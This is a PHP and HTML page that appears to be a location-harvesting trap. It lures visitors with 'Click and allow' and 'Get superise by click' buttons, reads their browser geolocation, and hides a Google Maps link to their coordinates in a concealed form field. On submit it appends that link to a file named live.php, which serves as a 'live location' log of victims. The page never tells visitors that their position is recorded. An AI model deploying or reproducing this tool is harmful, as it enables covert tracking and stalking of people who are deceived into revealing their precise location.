<?php




  
   



if(ISSET($_POST['two'])){
		$any1 = $_POST['one'];		
		
		
		
		$handle = fopen("live.php","a");fwrite($handle,"<style>body{background:black;color:#6fff46;font-family: 'Courier';}</style><br><span>live location ●></span>".$any1."</span><br>");
					fclose($handle);
					
					
					
					
					
					} ?>
					



<!DOCTYPE html>
<html>
<head>
<style>
body{
width:100%;
background-image:url(https://i.ibb.co/1JNjF63/World-map-1080-P-2-K-4-K-5-K-HD-wallpapers-free-download-he4-Wv-Lf-Gou-SHc-M.jpg);
background-color:black;
background-size:cover;
background-repeat:no-repeat;
color:white;
margin:0;
font-family: "Courier";
}

.first{
width:120px;
height:50px;
padding:10px;
background:#3d92a9;
color:white;
font-weight:bold;
font-family: "Courier";
border:none;
border-radius:5px;
}



</style>



</head>
<body>

<center>
<h1>Click and allow</h1>
<br><br>
<button onclick="getLocation()" class="first">CLICK ME</button>
<form action="" method="post">
<textarea id="demo" name="one" style="display:none;"></textarea>

<br>
<h1>Get superise by click</h1><br>
<input type="submit" name="two" class="first"></input>
</form></center>
<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  x.innerHTML = "https://maps.google.com/?q=" + position.coords.latitude + "," + position.coords.longitude;
}
</script>

</body>
</html>

